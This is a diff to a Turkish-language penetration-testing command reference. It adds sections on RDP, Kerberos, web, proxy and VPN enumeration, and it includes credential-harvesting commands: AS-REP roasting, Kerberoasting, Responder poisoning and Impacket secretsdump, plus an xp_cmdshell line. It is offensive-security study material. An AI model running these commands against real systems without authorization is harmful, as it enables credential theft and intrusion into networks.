@@ -153,11 +153,11 @@ Invoke-ShareFinder
 
 ### 2.6. SMB Keşfi
 
-#### `smbclient -L //<IP>`
+#### `smbclient -L \\<IP>`
 **Amaç:** Bir hedefteki SMB paylaşımlarını listeler.
 
 ```bash
-smbclient -L //<IP>
+smbclient -L \\<IP>
 ```
 
 #### `smbmap -H <IP>`
@@ -309,6 +309,96 @@ sqsh -S <IP> -U <username>
 
 ```sql
 EXEC xp_cmdshell 'whoami';
+```
+
+---
+
+### 2.15. RDP Keşfi ve Saldırıları
+
+#### `nmap -p 3389 --script rdp-enum-encryption <IP>`
+**Amaç:** Hedefte RDP açık olup olmadığını kontrol etmek.
+
+```bash
+nmap -p 3389 --script rdp-enum-encryption <IP>
+```
+
+#### `xfreerdp`
+**Amaç:** Hedef RDP sunucusuna bağlanmak.
+
+```bash
+xfreerdp /u:<username> /p:<password> /v:<IP>
+```
+
+---
+
+### 2.16. Kerberos Keşfi ve Saldırıları
+
+#### `python GetNPUsers.py <domain>/<username> -request`
+**Amaç:** Kerberos kullanıcılarının Pre-Authentication zafiyetlerini test etmek.
+
+```bash
+python GetNPUsers.py <domain>/<username> -request
+```
+
+#### `Invoke-Kerberoast`
+**Amaç:** Kerberoasting saldırıları için SPN bilgilerini toplar.
+
+```powershell
+Invoke-Kerberoast -OutputFormat Hashcat
+```
+
+---
+
+### 2.17. Web Servisleri Keşfi
+
+#### `nikto`
+**Amaç:** Hedef web sunucusunda güvenlik açıklarını tarar.
+
+```bash
+nikto -h <IP>
+```
+
+#### `dirsearch`
+**Amaç:** Web sunucusunda dizin ve dosya keşfi yapar.
+
+```bash
+python3 dirsearch.py -u http://<IP> -e php,asp,aspx
+```
+
+---
+
+### 2.18. Proxy ve VPN Keşfi
+
+#### `proxychains`
+**Amaç:** Proxy üzerinden tarama yapmak.
+
+```bash
+proxychains nmap -sT <IP>
+```
+
+#### `ike-scan`
+**Amaç:** VPN servislerini tarar.
+
+```bash
+ike-scan <IP>
+```
+
+---
+
+### Ek Araçlar ve Güvenlik Zayıflıkları
+
+#### Responder
+**Amaç:** LLMNR, NBT-NS ve MDNS isteklerini zehirleyerek kimlik bilgisi toplar.
+
+```bash
+responder -I <interface>
+```
+
+#### Impacket-Tools
+**Amaç:** Impacket araçlarıyla AD ortamında kimlik doğrulama ve veri toplama.
+
+```bash
+python secretsdump.py <domain>/<username>:<password>@<IP>
 ```
 
 ---
